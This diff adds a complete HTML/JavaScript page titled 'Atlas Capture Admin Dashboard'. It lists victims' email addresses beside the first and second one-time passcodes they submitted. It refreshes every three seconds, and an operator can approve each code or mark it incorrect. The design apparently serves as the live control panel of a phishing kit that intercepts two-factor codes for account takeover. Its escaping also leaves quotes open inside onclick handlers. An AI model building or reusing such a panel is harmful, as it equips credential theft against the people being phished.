@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard - Atlas Capture</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+
+body{
+  background:#f3f4f6;
+}
+
+.navbar{
+  background:#fff;
+  padding:16px 24px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  box-shadow:0 1px 3px rgba(0,0,0,0.05);
+  border-bottom:1px solid #e5e7eb;
+  flex-wrap:wrap;
+  gap:10px;
+}
+.navbar h1{
+  font-size:20px;
+  font-weight:600;
+  color:#1f2937;
+}
+.navbar-right{
+  display:flex;
+  gap:12px;
+  align-items:center;
+  flex-wrap:wrap;
+}
+.logout-btn{
+  background:#ef4444;
+  color:white;
+  border:none;
+  padding:8px 20px;
+  border-radius:10px;
+  cursor:pointer;
+  font-weight:500;
+}
+
+.container{
+  max-width:1400px;
+  margin:24px auto;
+  padding:0 20px;
+}
+
+.stats{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:16px;
+  margin-bottom:24px;
+}
+.stat-card{
+  background:#fff;
+  padding:20px;
+  border-radius:16px;
+  border:1px solid #e5e7eb;
+}
+.stat-card h3{
+  font-size:13px;
+  color:#6b7280;
+  margin-bottom:8px;
+}
+.stat-card .number{
+  font-size:32px;
+  font-weight:700;
+  color:#4f46e5;
+}
+
+.table-container{
+  background:#fff;
+  border-radius:16px;
+  border:1px solid #e5e7eb;
+  overflow:auto;
+}
+table{
+  width:100%;
+  border-collapse:collapse;
+  min-width:1000px;
+}
+th{
+  text-align:left;
+  padding:16px;
+  background:#f9fafb;
+  font-weight:600;
+  color:#374151;
+  border-bottom:1px solid #e5e7eb;
+}
+td{
+  padding:14px 16px;
+  border-bottom:1px solid #f0f0f0;
+  color:#4b5563;
+}
+.badge{
+  display:inline-block;
+  padding:4px 10px;
+  border-radius:20px;
+  font-size:12px;
+  font-weight:500;
+}
+.badge-pending{background:#fef3c7;color:#d97706;}
+.badge-approved{background:#d1fae5;color:#059669;}
+.badge-waiting{background:#e0e7ff;color:#4f46e5;}
+.badge-email{background:#fef3c7;color:#d97706;}
+
+.approve-email-btn{
+  background:#f59e0b;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+  margin-right:8px;
+}
+.approve-first-btn{
+  background:#059669;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+  margin-right:8px;
+}
+.approve-second-btn{
+  background:#059669;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+  margin-right:8px;
+}
+.incorrect-btn{
+  background:#ef4444;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+  margin-right:8px;
+}
+.delete-btn{
+  background:#6b7280;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+}
+
+.notification-toast{
+  position:fixed;
+  top:20px;
+  right:20px;
+  background:#fff;
+  border-left:4px solid #4f46e5;
+  padding:16px 20px;
+  border-radius:12px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.1);
+  display:none;
+  z-index:1000;
+  animation:slideIn 0.3s ease;
+  max-width:350px;
+}
+@keyframes slideIn{
+  from{transform:translateX(100%);opacity:0;}
+  to{transform:translateX(0);opacity:1;}
+}
+.notification-toast h4{
+  color:#4f46e5;
+  margin-bottom:4px;
+  font-size:14px;
+}
+.notification-toast p{
+  color:#6b7280;
+  font-size:13px;
+}
+</style>
+</head>
+<body>
+
+<div class="navbar">
+  <h1>Atlas Capture Admin Dashboard</h1>
+  <div class="navbar-right">
+    <button class="logout-btn" onclick="logout()">Logout</button>
+  </div>
+</div>
+
+<div id="notificationToast" class="notification-toast">
+  <h4 id="notificationTitle">New Request</h4>
+  <p id="notificationMessage"></p>
+</div>
+
+<div class="container">
+  <div class="stats">
+    <div class="stat-card">
+      <h3>Total Users</h3>
+      <div class="number" id="totalUsers">0</div>
+    </div>
+    <div class="stat-card">
+      <h3>Pending Email Approval</h3>
+      <div class="number" id="pendingEmail">0</div>
+    </div>
+    <div class="stat-card">
+      <h3>Pending First OTP</h3>
+      <div class="number" id="pendingFirstOTP">0</div>
+    </div>
+    <div class="stat-card">
+      <h3>Pending Second OTP</h3>
+      <div class="number" id="pendingSecondOTP">0</div>
+    </div>
+  </div>
+
+  <div class="table-container">
+    <table>
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>First OTP</th>
+          <th>Second OTP</th>
+          <th>Status</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="usersTableBody">
+        <tr><td colspan="5" style="text-align:center; padding:40px;">Loading...</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+  const token = localStorage.getItem('adminToken');
+  if (!token) window.location.href = '/admin/login';
+
+  function showNotification(title, message) {
+    const toast = document.getElementById('notificationToast');
+    document.getElementById('notificationTitle').textContent = title;
+    document.getElementById('notificationMessage').textContent = message;
+    toast.style.display = 'block';
+    setTimeout(() => { toast.style.display = 'none'; }, 5000);
+  }
+
+  async function loadUsers() {
+    try {
+      const response = await fetch('/api/admin/users', {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      if (response.status === 403) {
+        localStorage.removeItem('adminToken');
+        window.location.href = '/admin/login';
+        return;
+      }
+      const users = await response.json();
+      displayUsers(users);
+      updateStats(users);
+    } catch(err) {
+      console.error(err);
+    }
+  }
+
+  function updateStats(users) {
+    const pendingEmail = users.filter(u => !u.approved).length;
+    const pendingFirstOTP = users.filter(u => u.approved === true && u.otp && !u.otp1_correct).length;
+    const pendingSecondOTP = users.filter(u => u.otp1_correct === true && u.second_otp && !u.otp2_correct).length;
+    
+    document.getElementById('totalUsers').textContent = users.length;
+    document.getElementById('pendingEmail').textContent = pendingEmail;
+    document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
+    document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
+  }
+
+  function escapeHtml(str) {
+    if (!str) return str;
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+
+  function displayUsers(users) {
+    const tbody = document.getElementById('usersTableBody');
+    if (!users.length) {
+      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px;">No users</td></tr>';
+      return;
+    }
+    
+    tbody.innerHTML = users.map(user => {
+      let statusBadge = '';
+      let actionButtons = '';
+      
+      if (!user.approved) {
+        statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
+        actionButtons = `<button class="approve-email-btn" onclick="approveEmail('${escapeHtml(user.email)}')">📧 Approve Email</button>
+                        <button class="delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')">🗑️ Delete</button>`;
+      } 
+      else if (user.approved && user.otp && !user.otp1_correct) {
+        statusBadge = '<span class="badge badge-waiting">🔐 First OTP Submitted - Pending Approval</span>';
+        actionButtons = `<button class="approve-first-btn" onclick="approveFirstOTP('${escapeHtml(user.email)}')">✅ Approve First OTP</button>
+                        <button class="incorrect-btn" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')">❌ Incorrect</button>
+                        <button class="delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')">🗑️ Delete</button>`;
+      }
+      else if (user.approved && user.otp1_correct && user.second_otp && !user.otp2_correct) {
+        statusBadge = '<span class="badge badge-waiting">🔐 Second OTP Submitted - Pending Approval</span>';
+        actionButtons = `<button class="approve-second-btn" onclick="approveSecondOTP('${escapeHtml(user.email)}')">✅ Approve Second OTP</button>
+                        <button class="incorrect-btn" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')">❌ Incorrect</button>
+                        <button class="delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')">🗑️ Delete</button>`;
+      }
+      else if (user.approved && user.otp1_correct && user.otp2_correct) {
+        statusBadge = '<span class="badge badge-approved">✅ Fully Verified</span>';
+        actionButtons = `<button class="delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')">🗑️ Delete</button>`;
+      }
+      else {
+        statusBadge = '<span class="badge badge-pending">Pending</span>';
+        actionButtons = `<button class="delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')">🗑️ Delete</button>`;
+      }
+      
+      return `
+        <tr>
+          <td><strong>${escapeHtml(user.email)}</strong></td>
+          <td>${user.otp ? `<span class="badge badge-waiting">${escapeHtml(user.otp)}</span>` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${user.second_otp ? `<span class="badge badge-waiting">${escapeHtml(user.second_otp)}</span>` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${statusBadge}</td>
+          <td>${actionButtons}</td>
+        </tr>
+      `;
+    }).join('');
+  }
+
+  async function approveEmail(email) {
+    showNotification('Email Approved', `Approving email for ${email}`);
+    try {
+      const response = await fetch('/api/admin/approve-user', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Approve email error:', error);
+    }
+  }
+
+  async function approveFirstOTP(email) {
+    showNotification('First OTP Approved', `Approved first OTP for ${email}`);
+    try {
+      const response = await fetch('/api/admin/approve-first-otp', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Approve first OTP error:', error);
+    }
+  }
+
+  async function incorrectFirstOTP(email) {
+    showNotification('Incorrect OTP', `Marked first OTP as incorrect for ${email}`);
+    try {
+      const response = await fetch('/api/admin/incorrect-first-otp', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Incorrect first OTP error:', error);
+    }
+  }
+
+  async function approveSecondOTP(email) {
+    showNotification('Second OTP Approved', `Approved second OTP for ${email}`);
+    try {
+      const response = await fetch('/api/admin/approve-second-otp', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Approve second OTP error:', error);
+    }
+  }
+
+  async function incorrectSecondOTP(email) {
+    showNotification('Incorrect Second OTP', `Marked second OTP as incorrect for ${email}`);
+    try {
+      const response = await fetch('/api/admin/incorrect-second-otp', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Incorrect second OTP error:', error);
+    }
+  }
+
+  async function deleteUser(email) {
+    if (!confirm(`Are you sure you want to delete user ${email}?`)) return;
+    
+    showNotification('User Deleted', `Deleted user ${email}`);
+    try {
+      const response = await fetch('/api/admin/delete-user', {
+        method: 'DELETE',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Delete user error:', error);
+    }
+  }
+
+  function logout() {
+    localStorage.removeItem('adminToken');
+    window.location.href = '/admin/login';
+  }
+
+  // Auto-refresh every 3 seconds
+  loadUsers();
+  setInterval(loadUsers, 3000);
+</script>
+
+</body>
+</html>
